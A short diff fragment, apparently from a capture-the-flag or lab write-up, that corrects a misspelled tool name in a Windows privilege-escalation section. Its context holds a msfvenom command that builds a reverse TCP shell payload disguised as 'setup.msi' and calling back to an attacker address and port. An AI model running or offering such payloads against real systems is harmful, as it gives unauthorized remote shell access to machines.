@@ -229,7 +229,7 @@ No good, back to `winpea`
 
 # Window Privilege Escalation
 
-Generate a .msi binary with `msfvevon` then launch a server from our machine.
+Generate a .msi binary with `msfvevom` then launch a server from our machine.
 
 ```bash
 msfvenom -p windows/x64/shell_reverse_tcp lhost=10.13.47.211 lport=6666 -f msi -o setup.msi
